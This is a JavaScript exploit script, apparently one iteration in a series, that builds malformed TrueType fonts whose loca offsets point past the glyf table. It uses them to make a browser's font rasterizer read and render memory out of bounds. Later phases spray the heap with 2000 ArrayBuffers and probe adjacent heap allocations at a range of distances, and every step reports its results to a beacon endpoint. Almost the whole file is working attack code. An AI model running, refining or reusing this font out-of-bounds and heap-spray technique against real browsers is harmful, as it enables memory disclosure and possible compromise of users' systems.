// p275 - loca OOB controlled glyph rendering
// V252 showed OOB loca loads but renders 0 pixels (heap data is invalid contours)
// Strategy: embed VALID glyph data past glyf end in the same ArrayBuffer
// This proves: FreeType reads past glyf boundary and renders the data
// Then: shrink buffer so OOB reads hit ADJACENT heap allocations with spray
//
// Beacon prefix: V275-

(function() {
  function B(tag, body) {
    try {
      var url = '/beacon/V275-' + tag + '?t=' + Date.now();
      if (body) navigator.sendBeacon(url, String(body).substring(0, 900));
      else new Image().src = url;
    } catch(e) {}
  }

  function hex(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }

  B('BOOT');

  function push16(arr, val) { arr.push((val >> 8) & 0xFF, val & 0xFF); }
  function push32(arr, val) { arr.push((val >> 24) & 0xFF, (val >> 16) & 0xFF, (val >> 8) & 0xFF, val & 0xFF); }
  function tag2u32(s) { return (s.charCodeAt(0) << 24) | (s.charCodeAt(1) << 16) | (s.charCodeAt(2) << 8) | s.charCodeAt(3); }

  // Build TrueType simple glyph data (a triangle)
  // numberOfContours=1, xMin=0, yMin=0, xMax=W, yMax=H
  // endPtsOfContours=[2], instructionLength=0
  // flags: ON_CURVE for each point, SHORT for coordinates
  // 3 points: (0,0), (W,0), (W/2,H) — a triangle
  function buildGlyph(W, H) {
    var g = [];
    push16(g, 1); // numberOfContours = 1
    push16(g, 0); // xMin
    push16(g, 0); // yMin
    push16(g, W); // xMax
    push16(g, H); // yMax
    push16(g, 2); // endPtsOfContours[0] = 2 (3 points: 0,1,2)
    push16(g, 0); // instructionLength = 0
    // Flags: each point is ON_CURVE_POINT (0x01)
    // Point 0 (0,0): ON_CURVE, X_SHORT_VECTOR, Y_SHORT_VECTOR, X_IS_POSITIVE, Y_IS_POSITIVE
    // But for first point, coords are absolute. With SHORT+POSITIVE: x=0 means dx=0
    // Actually with short vectors: flag bits 1(x short) + 4(x same/positive) + 2(y short) + 5(y same/positive)
    // Bit 0: ON_CURVE = 0x01
    // Bit 1: X_SHORT_VECTOR = 0x02
    // Bit 2: Y_SHORT_VECTOR = 0x04
    // Bit 4: X_IS_SAME_OR_POSITIVE = 0x10 (if X_SHORT: 1=positive, 0=negative)
    // Bit 5: Y_IS_SAME_OR_POSITIVE = 0x20 (if Y_SHORT: 1=positive, 0=negative)

    // Point 0: (0, 0) - x=0,y=0. Use SHORT + SAME (delta=0, skip byte)
    // Actually, X_SHORT + X_IS_SAME means delta is 0 (no byte stored)
    // Hmm, this gets complicated with the encoding. Let me use NON-short (2-byte coords)
    // If !X_SHORT and X_IS_SAME: x coordinate unchanged (delta=0, no bytes)
    // If !X_SHORT and !X_IS_SAME: x coordinate is 2-byte signed delta

    // Simplest: all non-short coordinates, explicit 2-byte deltas
    // Flag: ON_CURVE (0x01) only, no short bits
    // Then each x,y is a 2-byte signed delta
    // Point 0: absolute (0,0) → dx=0, dy=0
    // Point 1: dx=W, dy=0
    // Point 2: dx=(W/2 - W), dy=H → dx=-W/2, dy=H

    // Flags for 3 points: 0x01, 0x01, 0x01
    g.push(0x01); // point 0 flags
    g.push(0x01); // point 1 flags
    g.push(0x01); // point 2 flags
    // X coordinates (int16 deltas): 0, W, -W/2
    push16(g, 0);     // x0 = 0
    push16(g, W);     // x1 = W
    push16(g, (-Math.floor(W/2)) & 0xFFFF); // x2 = -W/2
    // Y coordinates (int16 deltas): 0, 0, H
    push16(g, 0);     // y0 = 0
    push16(g, 0);     // y1 = 0
    push16(g, H);     // y2 = H
    return g;
  }

  // Build font with OOB loca pointing to data WITHIN the same buffer
  // glyf has 1 valid empty glyph (.notdef) at offset 0
  // loca[1] points PAST glyf end to where we place our controlled glyph
  function buildOOBFont(glyphW, glyphH, oobDistance) {
    var T = {};

    // head (54 bytes, indexToLocFormat=1 for 32-bit loca)
    var h = [];
    push32(h, 0x00010000);
    push32(h, 0x00005000);
    push32(h, 0x00000000);
    push32(h, 0x5F0F3CF5);
    push16(h, 0x000B);
    push16(h, 1000); // unitsPerEm
    for (var i = 0; i < 16; i++) h.push(0); // dates
    push16(h, 0); push16(h, 0);
    push16(h, 1000); push16(h, 1000);
    push16(h, 0); push16(h, 8);
    push16(h, 2);
    push16(h, 1); // indexToLocFormat = 1 (long)
    push16(h, 0);
    T['head'] = h;

    // hhea (36 bytes)
    var hh = [];
    push32(hh, 0x00010000);
    push16(hh, 800); push16(hh, (-200) & 0xFFFF); push16(hh, 0);
    push16(hh, 1000);
    for (var i = 0; i < 11; i++) push16(hh, 0);
    push16(hh, 2); // numberOfHMetrics
    T['hhea'] = hh;

    // maxp (6 bytes, v0.5)
    var mx = [];
    push32(mx, 0x00005000);
    push16(mx, 2); // numGlyphs = 2 (notdef + 1)
    T['maxp'] = mx;

    // hmtx (8 bytes: 2 entries)
    var hm = [];
    push16(hm, 500); push16(hm, 0); // glyph 0: advance=500, lsb=0
    push16(hm, 800); push16(hm, 0); // glyph 1: advance=800, lsb=0
    T['hmtx'] = hm;

    // cmap (format 4 for 'A' → glyph 1)
    var cm = [];
    push16(cm, 0); // version
    push16(cm, 1); // numTables
    push16(cm, 3); // platformID (Windows)
    push16(cm, 1); // encodingID (Unicode BMP)
    push32(cm, 12); // offset to subtable
    // Format 4 subtable
    push16(cm, 4); // format
    push16(cm, 32); // length
    push16(cm, 0); // language
    push16(cm, 4); // segCountX2 (2 segments)
    push16(cm, 4); // searchRange
    push16(cm, 1); // entrySelector
    push16(cm, 0); // rangeShift
    // endCode: 0x41, 0xFFFF
    push16(cm, 0x41); push16(cm, 0xFFFF);
    push16(cm, 0); // reservedPad
    // startCode: 0x41, 0xFFFF
    push16(cm, 0x41); push16(cm, 0xFFFF);
    // idDelta: -0x40 (0x41 - 0x40 = 1 → glyph 1), 1
    push16(cm, (-0x40) & 0xFFFF); push16(cm, 1);
    // idRangeOffset: 0, 0
    push16(cm, 0); push16(cm, 0);
    T['cmap'] = cm;

    // post (32 bytes, format 3)
    var po = [];
    push32(po, 0x00030000);
    push32(po, 0); push16(po, 0); push16(po, 0);
    push32(po, 0); push32(po, 0); push32(po, 0); push32(po, 0);
    T['post'] = po;

    // glyf (just .notdef = 0 bytes; glyph 1 data is placed OOB)
    T['glyf'] = [0]; // 1 byte placeholder

    // Build glyph data to embed at OOB location
    var glyphData = buildGlyph(glyphW, glyphH);

    // loca (3 entries * 4 bytes = 12 bytes for 32-bit format)
    // loca[0] = 0 (notdef start)
    // loca[1] = oobDistance (past glyf end, where we place our glyph)
    // loca[2] = oobDistance + glyphData.length (glyph 1 end)
    var lo = [];
    push32(lo, 0);
    push32(lo, oobDistance);
    push32(lo, oobDistance + glyphData.length);
    T['loca'] = lo;

    // Assemble font with padding after glyf for OOB data
    var tags = ['head', 'hhea', 'maxp', 'hmtx', 'cmap', 'post', 'glyf', 'loca'];
    var nt = tags.length;
    var dirEnd = 12 + nt * 16;
    var offsets = {};
    var cur = dirEnd;
    for (var i = 0; i < nt; i++) {
      offsets[tags[i]] = cur;
      cur += T[tags[i]].length;
      cur = (cur + 3) & ~3; // pad to 4
    }

    // Total buffer: after loca, add padding + OOB glyph data
    // OOB glyph should be at: glyf_offset + oobDistance
    var glyfOffset = offsets['glyf'];
    var oobTarget = glyfOffset + oobDistance;
    var totalSize = Math.max(cur, oobTarget + glyphData.length + 4);

    var buf = new ArrayBuffer(totalSize);
    var u8 = new Uint8Array(buf);
    var dv = new DataView(buf);

    // Write offset table
    dv.setUint32(0, 0x00010000);
    dv.setUint16(4, nt);
    dv.setUint16(6, 128); dv.setUint16(8, 3);
    dv.setUint16(10, nt * 16 - 128);

    // Write table directory
    for (var i = 0; i < nt; i++) {
      var d = 12 + i * 16;
      var tg = tags[i];
      dv.setUint8(d, tg.charCodeAt(0));
      dv.setUint8(d+1, tg.charCodeAt(1));
      dv.setUint8(d+2, tg.charCodeAt(2));
      dv.setUint8(d+3, tg.charCodeAt(3));
      dv.setUint32(d+4, 0); // checksum
      dv.setUint32(d+8, offsets[tg]);
      dv.setUint32(d+12, T[tg].length);
      // Write table data
      for (var j = 0; j < T[tg].length; j++) {
        u8[offsets[tg] + j] = T[tg][j];
      }
    }

    // Write OOB glyph data at target location
    for (var i = 0; i < glyphData.length; i++) {
      u8[oobTarget + i] = glyphData[i];
    }

    return { buf: buf, glyfOff: glyfOffset, oobTarget: oobTarget, size: totalSize };
  }

  // Phase 1: Prove OOB loca renders controlled glyph data
  function phase1() {
    B('P1-START');

    var tests = [
      { w: 400, h: 700, oob: 64, desc: '400x700-OOB64' },
      { w: 200, h: 900, oob: 128, desc: '200x900-OOB128' },
      { w: 600, h: 400, oob: 256, desc: '600x400-OOB256' },
      { w: 100, h: 100, oob: 512, desc: '100x100-OOB512' }
    ];

    var canvas = document.createElement('canvas');
    canvas.width = 128;
    canvas.height = 128;
    var ctx = canvas.getContext('2d');

    var ti = 0;
    function nextTest() {
      if (ti >= tests.length) { phase2(); return; }
      var t = tests[ti]; ti++;
      B('P1-T' + (ti-1) + '-' + t.desc);

      try {
        var font = buildOOBFont(t.w, t.h, t.oob);
        B('P1-T' + (ti-1) + '-SIZE-' + font.size + '-GLYF-' + font.glyfOff + '-OOB-' + font.oobTarget);

        var face = new FontFace('P275F' + ti, font.buf);
        face.load().then(function(loadedFace) {
          B('P1-T' + (ti-1) + '-LOADED');
          document.fonts.add(loadedFace);

          ctx.clearRect(0, 0, 128, 128);
          ctx.fillStyle = '#000';
          ctx.fillRect(0, 0, 128, 128);
          ctx.font = '96px P275F' + ti;
          ctx.fillStyle = '#FFF';
          ctx.textBaseline = 'top';
          ctx.fillText('A', 0, 0);

          // Count non-black pixels
          var imgData = ctx.getImageData(0, 0, 128, 128);
          var px = imgData.data;
          var nonBlack = 0;
          var whiteCount = 0;
          var maxR = 0, maxG = 0, maxB = 0;
          for (var p = 0; p < px.length; p += 4) {
            if (px[p] > 10 || px[p+1] > 10 || px[p+2] > 10) {
              nonBlack++;
              if (px[p] > maxR) maxR = px[p];
              if (px[p+1] > maxG) maxG = px[p+1];
              if (px[p+2] > maxB) maxB = px[p+2];
            }
            if (px[p] > 200 && px[p+1] > 200 && px[p+2] > 200) whiteCount++;
          }
          B('P1-T' + (ti-1) + '-PX-' + nonBlack + '-W-' + whiteCount + '-MAX-' + maxR + ',' + maxG + ',' + maxB);

          // measureText
          var m = ctx.measureText('A');
          B('P1-T' + (ti-1) + '-MEAS-W' + m.width.toFixed(1) +
            '-ABL' + (m.actualBoundingBoxLeft||0).toFixed(1) +
            '-ABR' + (m.actualBoundingBoxRight||0).toFixed(1) +
            '-ABA' + (m.actualBoundingBoxAscent||0).toFixed(1) +
            '-ABD' + (m.actualBoundingBoxDescent||0).toFixed(1));

          if (nonBlack > 0) {
            B('P1-T' + (ti-1) + '-RENDER-SUCCESS');
          } else {
            B('P1-T' + (ti-1) + '-RENDER-EMPTY');
          }

          document.fonts.delete(loadedFace);
          setTimeout(nextTest, 200);
        }).catch(function(e) {
          B('P1-T' + (ti-1) + '-FAIL-' + e.message.substring(0, 30));
          setTimeout(nextTest, 200);
        });
      } catch(e) {
        B('P1-T' + (ti-1) + '-ERR-' + e.message.substring(0, 30));
        setTimeout(nextTest, 200);
      }
    }
    nextTest();
  }

  // Phase 2: Build SMALL font, spray heap, try to render adjacent heap data
  function phase2() {
    B('P2-START');

    // Spray valid glyph data into heap
    // Each spray AB contains repeated valid simple glyph: triangle 300x500
    var glyphBytes = buildGlyph(300, 500);
    var spraySize = 4096;
    var sprayCount = 2000;
    var sprays = [];

    for (var i = 0; i < sprayCount; i++) {
      var ab = new ArrayBuffer(spraySize);
      var u8 = new Uint8Array(ab);
      // Fill with repeated glyph data
      for (var j = 0; j < spraySize; j++) {
        u8[j] = glyphBytes[j % glyphBytes.length];
      }
      sprays.push(ab);
    }
    B('P2-SPRAYED-' + sprays.length);

    // Build small font (minimal size to maximize OOB reach into adjacent heap)
    var smallFont = buildOOBFont(300, 500, 512);
    B('P2-FONT-SIZE-' + smallFont.size);

    var canvas = document.createElement('canvas');
    canvas.width = 128;
    canvas.height = 128;
    var ctx = canvas.getContext('2d');

    var face = new FontFace('P275HEAP', smallFont.buf);
    face.load().then(function(loadedFace) {
      B('P2-LOADED');
      document.fonts.add(loadedFace);

      ctx.clearRect(0, 0, 128, 128);
      ctx.fillStyle = '#000';
      ctx.fillRect(0, 0, 128, 128);
      ctx.font = '96px P275HEAP';
      ctx.fillStyle = '#FFF';
      ctx.textBaseline = 'top';
      ctx.fillText('A', 0, 0);

      var imgData = ctx.getImageData(0, 0, 128, 128);
      var px = imgData.data;
      var nonBlack = 0;
      for (var p = 0; p < px.length; p += 4) {
        if (px[p] > 10 || px[p+1] > 10 || px[p+2] > 10) nonBlack++;
      }
      B('P2-PX-' + nonBlack);

      var m = ctx.measureText('A');
      B('P2-MEAS-W' + m.width.toFixed(1) +
        '-ABA' + (m.actualBoundingBoxAscent||0).toFixed(1) +
        '-ABD' + (m.actualBoundingBoxDescent||0).toFixed(1));

      if (nonBlack > 0) {
        B('P2-HEAP-RENDER-HIT');
      } else {
        B('P2-HEAP-RENDER-EMPTY');
      }

      document.fonts.delete(loadedFace);
    }).catch(function(e) {
      B('P2-FAIL-' + e.message.substring(0, 30));
    });

    // Phase 3: Try multiple OOB distances
    setTimeout(function() { phase3(sprays); }, 3000);
  }

  // Phase 3: Multiple OOB distances to find where heap data is readable
  function phase3(sprays) {
    B('P3-START');
    var distances = [32, 64, 128, 256, 512, 1024, 2048, 4096, 8192];
    var canvas = document.createElement('canvas');
    canvas.width = 128;
    canvas.height = 128;
    var ctx = canvas.getContext('2d');

    var di = 0;
    function nextDist() {
      if (di >= distances.length) {
        B('P3-DONE');
        B('ALL-DONE');
        return;
      }
      var dist = distances[di]; di++;

      try {
        var font = buildOOBFont(300, 500, dist);
        var face = new FontFace('P275D' + dist, font.buf);
        face.load().then(function(lf) {
          document.fonts.add(lf);
          ctx.clearRect(0, 0, 128, 128);
          ctx.fillStyle = '#000';
          ctx.fillRect(0, 0, 128, 128);
          ctx.font = '96px P275D' + dist;
          ctx.fillStyle = '#FFF';
          ctx.fillText('A', 0, 0);

          var imgData = ctx.getImageData(0, 0, 128, 128);
          var px = imgData.data;
          var nonBlack = 0;
          for (var p = 0; p < px.length; p += 4) {
            if (px[p] > 10 || px[p+1] > 10 || px[p+2] > 10) nonBlack++;
          }

          var m = ctx.measureText('A');
          B('P3-D' + dist + '-PX-' + nonBlack + '-W' + m.width.toFixed(1));

          document.fonts.delete(lf);
          setTimeout(nextDist, 200);
        }).catch(function(e) {
          B('P3-D' + dist + '-FAIL-' + e.message.substring(0, 20));
          setTimeout(nextDist, 200);
        });
      } catch(e) {
        B('P3-D' + dist + '-ERR');
        setTimeout(nextDist, 200);
      }
    }
    nextDist();
  }

  phase1();
})();
